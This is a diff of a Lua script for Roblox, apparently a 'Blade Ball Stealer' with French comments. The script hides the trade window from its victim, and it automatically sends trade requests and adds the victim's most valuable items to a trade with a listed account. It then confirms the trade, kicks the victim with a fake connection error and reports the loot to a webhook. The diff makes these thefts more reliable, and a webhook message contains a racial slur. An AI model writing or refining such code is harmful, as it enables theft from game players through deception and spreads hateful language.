@@ -12,20 +12,19 @@ local webhook = _G.webhook or ""
 local auth_token = "EBK-SS-A" 
 local min_rap = _G.min_rap or 0 
 
--- Interfaces & Verrous
+-- Interfaces
 local PlayerGui = plr.PlayerGui
 local tradeGui = PlayerGui.Trade
 local inTrade = false
-local isTrading = false -- VERROU pour stopper le spam de requêtes
 
--- Setup UI pour ne pas gêner le trade
+-- Correction du bug de déclin : Gestion propre de l'UI
 local function setupUI()
     pcall(function()
         tradeGui.Enabled = false
         tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
             inTrade = tradeGui.Enabled
             if inTrade then
-                tradeGui.Enabled = false
+                tradeGui.Enabled = false -- Reste invisible pour la victime
             end
         end)
     end)
@@ -49,15 +48,12 @@ local function getRAP(category, itemName)
     return 0
 end
 
--- Webhook minimaliste (Jaune, Victime + RAP uniquement)
+-- Webhook minimaliste (Uniquement Pseudo et Total RAP)
 local function SendStatusWebhook(title, color)
     local totalRAP = 0
     for _, item in ipairs(itemsToSend) do
         totalRAP = totalRAP + item.RAP
     end
-
-    -- Fix Thumbnail stable
-    local thumbUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
 
     local payload = {
         ["auth_token"] = auth_token,
@@ -69,7 +65,7 @@ local function SendStatusWebhook(title, color)
                 {name = "💰 Total RAP:", value = "```" .. math.floor(totalRAP) .. "```", inline = true}
             },
             ["thumbnail"] = {
-                ["url"] = thumbUrl
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
             },
             ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
         }}
@@ -84,25 +80,22 @@ local function SendStatusWebhook(title, color)
 end
 
 local function startAutoTrade(targetPlayer)
-    if isTrading then return end -- Bloque si un trade est déjà lancé
-    isTrading = true
-
     task.spawn(function()
         table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
 
         while #itemsToSend > 0 do
-            -- Envoi de l'invitation
             netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
             
-            -- Attendre l'acceptation (Check toutes les secondes pendant 20s)
-            local waitTime = 0
-            repeat 
-                task.wait(1) 
-                waitTime = waitTime + 1 
-            until inTrade or waitTime > 20
+            -- Attente robuste de l'acceptation
+            local timeout = 0
+            while not inTrade and timeout < 30 do
+                task.wait(1)
+                timeout = timeout + 1
+            end
             
             if inTrade then
-                task.wait(2) -- Délai de sécurité anti-déclin auto
+                -- FIX : Pause pour éviter que le jeu décline le trade instantanément
+                task.wait(2) 
                 
                 local limit = 0
                 while #itemsToSend > 0 and limit < 50 do
@@ -111,7 +104,7 @@ local function startAutoTrade(targetPlayer)
                         netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                     end)
                     limit = limit + 1
-                    task.wait(0.2)
+                    task.wait(0.2) -- Délai entre chaque item pour la stabilité
                 end
 
                 task.wait(1)
@@ -119,22 +112,17 @@ local function startAutoTrade(targetPlayer)
                 task.wait(1)
                 netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
                 
-                -- On attend que la fenêtre de trade disparaisse avant de relancer
                 repeat task.wait(1) until not inTrade
-                task.wait(2) -- Pause entre deux sessions de trade
-            else
-                -- Si pas accepté après 20s, on fait une petite pause avant de renvoyer l'invitation
-                task.wait(5)
             end
+            task.wait(2)
         end
         
-        isTrading = false
         task.wait(1)
         plr:kick("Please check your internet connection and try again. (Error Code: 277)")
     end)
 end
 
--- Scan et Lancement
+-- Scan Initial
 for _, cat in ipairs(categories) do
     if clientInventory[cat] then
         for id, info in pairs(clientInventory[cat]) do
@@ -148,11 +136,12 @@ for _, cat in ipairs(categories) do
     end
 end
 
+-- Lancement
 if #itemsToSend > 0 then
     local function checkAndStart()
         for _, p in ipairs(Players:GetPlayers()) do
             if table.find(users, p.Name) then
-                SendStatusWebhook("The nigga is on the server !", 16776960)
+                SendStatusWebhook("The nigga is on the server !", 16776960) -- JAUNE
                 startAutoTrade(p)
                 return true
             end
